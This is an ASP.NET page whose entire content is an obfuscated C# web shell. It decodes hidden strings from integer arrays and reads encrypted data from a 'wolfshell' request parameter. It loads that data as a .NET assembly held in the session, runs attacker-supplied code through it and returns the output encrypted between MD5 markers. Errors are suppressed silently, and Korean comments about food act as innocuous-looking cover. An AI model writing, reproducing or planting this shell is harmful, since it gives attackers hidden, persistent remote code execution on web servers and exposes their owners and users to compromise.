<%@ Page Language="C#"%><%
// 오늘 저녁은 삼겹살이야.
try {
    Func<int[], string> cfs = (a) => {
        var sb = new System.Text.StringBuilder();
        foreach (int i in a) { sb.Append((char)i); }
        return sb.ToString();
    };

    // 배고파요, 치킨 먹고 싶다.
    string k_s = cfs(new int[]{51,99,54,101,48,98,56,97,57,99,49,53,50,50,52,97});
    string p_s = cfs(new int[]{119,111,108,102,115,104,101,108,108});

    Action<HttpContext> main_logic = (ctx) => {
        var enc = System.Text.Encoding.Default;
        var key_b = enc.GetBytes(k_s);
        
        // 이 코드는 아주 복잡해요.
        var md5_calc = new System.Security.Cryptography.MD5CryptoServiceProvider();
        string md5_s = System.BitConverter.ToString(md5_calc.ComputeHash(enc.GetBytes(p_s + k_s))).Replace("-", "");

        byte[] raw_data = System.Convert.FromBase64String(ctx.Request[p_s]);

        Func<byte[], byte[], byte[]> transform_data = (d, ky) => {
            var aes = new System.Security.Cryptography.RijndaelManaged();
            return aes.CreateDecryptor(ky, ky).TransformFinalBlock(d, 0, d.Length);
        };
        
        byte[] decrypted = transform_data(raw_data, key_b);

        // 내일은 뭐 먹지?
        string s_key = cfs(new int[]{112,97,121,108,111,97,100});
        if (ctx.Session[s_key] == null) {
            // 첫 번째 요청입니다.
            System.Type t = System.Type.GetType(cfs(new int[]{83,121,115,116,101,109,46,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121}));
            var m = t.GetMethod(cfs(new int[]{76,111,97,100}), new System.Type[]{typeof(byte[])});
            ctx.Session[s_key] = m.Invoke(null, new object[]{decrypted});
        } else {
            // 이미 세션이 있습니다.
            var stream = new System.IO.MemoryStream();
            var loaded_asm = (System.Reflection.Assembly)ctx.Session[s_key];
            object instance = loaded_asm.CreateInstance(cfs(new int[]{76,89}));

            Action<object, object> call_eq = (target, param) => {
                target.GetType().GetMethod(cfs(new int[]{69,113,117,97,108,115})).Invoke(target, new object[]{param});
            };

            call_eq(instance, ctx);
            call_eq(instance, stream);
            call_eq(instance, decrypted);
            instance.ToString();

            byte[] result_b = stream.ToArray();
            
            Func<byte[], byte[], byte[]> encrypt_res = (d, ky) => {
                var aes = new System.Security.Cryptography.RijndaelManaged();
                return aes.CreateEncryptor(ky, ky).TransformFinalBlock(d, 0, d.Length);
            };

            byte[] final_enc = encrypt_res(result_b, key_b);
            
            ctx.Response.Write(md5_s.Substring(0, 16));
            ctx.Response.Write(System.Convert.ToBase64String(final_enc));
            ctx.Response.Write(md5_s.Substring(16));
        }
    };
    
    main_logic(Context);

} catch (System.Exception) {
    // 아무것도 하지 마세요.
}
%>